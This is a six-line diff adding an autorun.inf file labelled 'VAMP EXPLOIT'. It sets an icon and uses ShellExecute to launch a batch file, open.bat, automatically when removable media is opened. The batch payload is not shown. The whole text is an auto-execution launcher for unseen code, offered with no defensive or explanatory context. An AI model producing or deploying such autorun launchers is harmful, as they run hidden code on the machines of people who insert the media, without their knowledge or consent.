@@ -1,0 +1,6 @@
+[autorun] 
+Icon=icon.ico
+Label=VAMP EXPLOIT
+;Open=start open.bat
+ShellExecute=open.bat
+UseAutoPlay=
